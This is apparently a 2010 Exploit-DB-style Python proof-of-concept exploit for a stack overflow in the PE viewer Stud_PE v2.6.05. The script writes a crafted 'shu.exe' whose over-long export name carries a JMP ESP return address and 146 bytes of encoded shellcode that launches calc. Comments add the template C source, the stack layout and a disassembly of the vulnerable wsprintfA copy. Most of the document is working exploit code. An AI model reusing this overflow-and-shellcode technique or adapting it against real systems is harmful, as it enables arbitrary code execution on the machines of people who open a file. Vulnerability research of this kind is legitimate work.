###################################################################
# Exploit Title: Stud_PE <= v2.6.05 Stack Overflow PoC exploit
# Date: 03/28/2010
# Author: zha0
# Software Link: http://www.cgsoftlabs.ro/studpe.html
# Version: Stud_PE <= v2.6.05
# Tested on: Windows XP SP3 CHT
# CVE :
# Code : 
# Greetz to : nanika, Catherine & chr00t team
###################################################################
#!/usr/bin/python

pe_exe=(
"\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00"
"\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xB0\x00\x00\x00"
"\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21\x54\x68"
"\x69\x73\x20\x70\x72\x6F\x67\x72\x61\x6D\x20\x63\x61\x6E\x6E\x6F"
"\x74\x20\x62\x65\x20\x72\x75\x6E\x20\x69\x6E\x20\x44\x4F\x53\x20"
"\x6D\x6F\x64\x65\x2E\x0D\x0D\x0A\x24\x00\x00\x00\x00\x00\x00\x00"
"\xCF\xA3\x03\xDB\x8B\xC2\x6D\x88\x8B\xC2\x6D\x88\x8B\xC2\x6D\x88"
"\xBD\xE4\x66\x88\x8A\xC2\x6D\x88\x74\xE2\x69\x88\x8A\xC2\x6D\x88"
"\x52\x69\x63\x68\x8B\xC2\x6D\x88\x00\x00\x00\x00\x00\x00\x00\x00"
"\x50\x45\x00\x00\x4C\x01\x01\x00\x75\xCE\xAE\x4B\x00\x00\x00\x00"
"\x00\x00\x00\x00\xE0\x00\x0F\x01\x0B\x01\x06\x00\x00\x02\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x00\x00\x00\x10\x00\x00"
"\x00\x20\x00\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x02\x00\x00"
"\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
"\x00\x20\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
"\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x10\x00\x00\x10\x00\x00"
"\x00\x00\x00\x00\x10\x00\x00\x00\x10\x10\x00\x00\x47\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x74\x65\x78\x74\x00\x00\x00"
"\x57\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x60"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xC3\xC3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x75\xCE\xAE\x4B\x00\x00\x00\x00\x42\x10\x00\x00"
"\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x38\x10\x00\x00"
"\x3C\x10\x00\x00\x40\x10\x00\x00\x00\x10\x00\x00\x52\x10\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75\x6E\x6B\x6A\x75"
"\x31\x31\x31\x31\x32\x32\x32\x32\x33\x33\x33\x33\xCE\x24\xFA\x7F" # 0x7FFA24CE JMP ESP Windows XP CHT SP2,SP3 
"\x90\xEB\x0F\x5E\x8B\xFE\x33\xC9\xB1\x7C\xAC\x34\x87\xAA\xE2\xFA" # Shellcode : 146 bytes, WinExec("calc"); ExitProcess(0);
"\xEB\x05\xE8\xEC\xFF\xFF\xFF\x6F\x8F\x87\x87\x87\x1F\x79\x0D\x89"
"\xF9\x5F\x65\xF4\xDF\xD7\xD7\xED\x85\xDE\xD8\xE0\xE3\x26\xB7\x87"
"\x0C\xC7\x8B\x0C\xF7\x9B\x2A\x0C\xEF\x8F\xD6\x0C\xF2\xBB\x0C\xF3"
"\xA9\xFF\x84\x72\xD1\x0C\xF1\xA7\x84\x72\xB4\x4E\xCE\xC6\x2A\x84"
"\x42\xB4\x5C\x88\x39\x97\xBF\x75\xF3\x8F\x46\x4C\x8A\x84\x5D\xC7"
"\x6C\x76\xBC\x98\xF2\x60\xD9\x0C\xD9\xA3\x84\x5A\xE1\x0C\x8B\xCC"
"\x0C\xD9\x9B\x84\x5A\x0C\x83\x0C\x84\x42\x2C\xDE\x65\x3B\xDA\xED"
"\x87\x6F\x82\x87\x87\x87\xE4\xE6\xEB\xE4\x87\x78\xD2\x87\xED\x87"
"\x78\xD2\x83\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
)

try:
   rap = open("shu.exe",'wb')
   rap.write(pe_exe)
   rap.close()
   print "Exploit file created!\n"
except:
   print "Error occured!"


# ---------------------------------------- ca.c Source ---------------------------------------------------------------
# // cl ca.c
# #include <windows.h>
#
# #pragma comment(linker, "/ENTRY:WinMain")
# #pragma comment(linker, "/ALIGN:4096 /FILEALIGN:512")
# #pragma comment(linker, "/merge:.rdata=.text")
# #pragma optimize("gsy", on)
#
# extern "C" __declspec (dllexport) void junkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkjunkju111122223333444455555(void){}
#
# int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { return 0; }
#
# ---------------------------------------- Stack ---------------------------------------------------------------------
# 0012F5BC
# ....
# ....            100h = 256 bytes
# ....            (contains string " rva: %08X ord:   %1d" ..)
# ....
# 0012F6BC   0012F6EC   Pointer to next SEH record
# 0012F6C0   00484171   SE handler
# 0012F6C4   FFFFFFFF
# 0012F6C8   00407C45   RETURN to Stud_PE.00407C45 from Stud_PE.0042F070
#
# ---------------------------------------- Stud_PE Code --------------------------------------------------------------
# sub_42F070
# .....
# 0042F4E9  |> \B9 40000000               |MOV ECX,40                                                    ; 40*sizeof(DWORD)
# 0042F4EE  |.  33C0                      |XOR EAX,EAX
# 0042F4F0  |.  8DBC24 58020000           |LEA EDI,DWORD PTR SS:[ESP+258]
# 0042F4F7  |.  F3:AB                     |REP STOS DWORD PTR ES:[EDI]
#
# 0042F4F9  |.  8B4424 1C                 |MOV EAX,DWORD PTR SS:[ESP+1C]
# 0042F4FD  |.  8B0CB0                    |MOV ECX,DWORD PTR DS:[EAX+ESI*4]
# 0042F500  |.  51                        |PUSH ECX
# 0042F501  |.  8D8C24 30010000           |LEA ECX,DWORD PTR SS:[ESP+130]
# 0042F508  |.  E8 A3AFFFFF               |CALL Stud_PE.0042A4B0
#
# // Copy the export name to stack
# 0042F50D  |.  50                        |PUSH EAX                                                      ; /<%s>
# 0042F50E  |.  8D9424 5C020000           |LEA EDX,DWORD PTR SS:[ESP+25C]                                ; |
# 0042F515  |.  68 40B44A00               |PUSH Stud_PE.004AB440                                         ; |Format = "  %s "
# 0042F51A  |.  52                        |PUSH EDX                                                      ; |s
# 0042F51B  |.  FF15 74864800             |CALL DWORD PTR DS:[<&USER32.wsprintfA>]                       ; \wsprintfA
# 0042F521  |.  83C4 0C                   |ADD ESP,0C
# 0042F524  |>  3B75 18                   |CMP ESI,[ARG.5]
# 0042F527  |.  75 1B                     |JNZ SHORT Stud_PE.0042F544
#
# 0042F529  |.  68 38B44A00               |PUSH Stud_PE.004AB438                                         ; /<%s> = "No name"
# 0042F52E  |.  8D8424 5C020000           |LEA EAX,DWORD PTR SS:[ESP+25C]                                ; |
# 0042F535  |.  68 40B44A00               |PUSH Stud_PE.004AB440                                         ; |Format = "  %s "
# 0042F53A  |.  50                        |PUSH EAX                                                      ; |s
# 0042F53B  |.  FF15 74864800             |CALL DWORD PTR DS:[<&USER32.wsprintfA>]                       ; \wsprintfA
# 0042F541  |.  83C4 0C                   |ADD ESP,0C
#
# 0042F544  |>  8D7C24 2C                 |LEA EDI,DWORD PTR SS:[ESP+2C]
# 0042F548  |.  83C9 FF                   |OR ECX,FFFFFFFF
# 0042F54B  |.  33C0                      |XOR EAX,EAX
# 0042F54D  |.  8D9424 58020000           |LEA EDX,DWORD PTR SS:[ESP+258]
# 0042F554  |.  F2:AE                     |REPNE SCAS BYTE PTR ES:[EDI]
# 0042F556  |.  F7D1                      |NOT ECX
# 0042F558  |.  2BF9                      |SUB EDI,ECX
# 0042F55A  |.  50                        |PUSH EAX                                                      ; /Arg9 => 00000000
# 0042F55B  |.  8BF7                      |MOV ESI,EDI                                                   ; |
# 0042F55D  |.  8BFA                      |MOV EDI,EDX                                                   ; |
# 0042F55F  |.  8BD1                      |MOV EDX,ECX                                                   ; |
# 0042F561  |.  83C9 FF                   |OR ECX,FFFFFFFF                                               ; |
# 0042F564  |.  F2:AE                     |REPNE SCAS BYTE PTR ES:[EDI]                                  ; |
# 0042F566  |.  8BCA                      |MOV ECX,EDX                                                   ; |
# 0042F568  |.  4F                        |DEC EDI                                                       ; |
# 0042F569  |.  C1E9 02                   |SHR ECX,2                                                     ; |
# 0042F56C  |.  F3:A5                     |REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]                ; |
# ...........
#
